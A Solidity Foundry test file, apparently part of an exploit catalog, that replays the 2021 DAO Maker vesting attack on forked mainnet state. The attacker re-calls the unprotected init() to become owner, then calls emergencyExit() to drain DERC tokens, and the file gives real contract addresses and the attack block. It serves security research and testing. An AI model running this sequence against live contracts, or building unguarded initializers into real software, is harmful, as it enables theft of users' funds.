// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";

/// FORK REPLAY — DAO Maker vesting unprotected `init` (Ethereum, 2021-09-03, ~$4M across tokens).
/// Ground-truth instance of catalog entry `unprotected-privileged-fn`
/// (docs/exploits/unprotected-privileged-fn.md): the vesting contract left `init(...)` callable by
/// anyone with no once-guard, so the attacker re-initialized it to become owner, then called the
/// owner-only `emergencyExit(recipient)` to drain the held tokens. One of several identical
/// DAO-Maker vesting deployments hit the same day; this replays the DERC one (~1.44M DERC).
///
/// Forks real mainnet state at the pre-attack block and drives the REAL deployed vesting contract;
/// only the attacker (this test contract) acts. Public facts (addresses/block/init args) from the
/// incident post-mortem + DeFiHackLabs index; the call sequence is dictated by the real ABI.
///
/// Run: set -a; source .env; set +a; forge test --match-contract DaoMakerInitDrain -vvv
interface IDaoMakerVesting {
    function init(uint256 startTime, uint256[] calldata releasePeriods, uint256[] calldata releasePercents, address token)
        external;
    function emergencyExit(address recipient) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract DaoMakerInitDrainReplayTest is Test {
    address constant VESTING = 0x2FD602Ed1F8cb6DEaBA9BEDd560ffE772eb85940;
    address constant DERC = 0x9fa69536d1cda4A04cFB50688294de75B505a9aE;
    uint256 constant ATTACK_BLOCK = 13_155_320;

    function test_realDaoMaker_unprotectedInitDrains() public {
        vm.createSelectFork(vm.rpcUrl("mainnet"), ATTACK_BLOCK);

        uint256 heldByVesting = IERC20(DERC).balanceOf(VESTING);
        uint256 attackerBefore = IERC20(DERC).balanceOf(address(this));
        emit log_named_uint("DERC held by vesting contract", heldByVesting);
        assertGt(heldByVesting, 0, "vesting contract must hold DERC at this block");

        // 1) Anyone can call init() — no access control, no once-guard. Re-initialize to seize owner.
        uint256[] memory releasePeriods = new uint256[](1);
        releasePeriods[0] = 5_702_400;
        uint256[] memory releasePercents = new uint256[](1);
        releasePercents[0] = 10_000;
        IDaoMakerVesting(VESTING).init(1_640_984_401, releasePeriods, releasePercents, DERC);

        // 2) As the freshly-installed owner, drain the held tokens to ourselves.
        IDaoMakerVesting(VESTING).emergencyExit(address(this));

        uint256 attackerAfter = IERC20(DERC).balanceOf(address(this));
        emit log_named_uint("attacker DERC stolen", attackerAfter - attackerBefore);

        // Invariant broken: a privileged action (ownership via init, then emergencyExit) was reachable
        // by an unauthenticated caller.
        assertEq(attackerAfter - attackerBefore, heldByVesting, "attacker drained the vesting contract's DERC");
        assertEq(IERC20(DERC).balanceOf(VESTING), 0, "vesting contract emptied");
    }

    receive() external payable {}
}
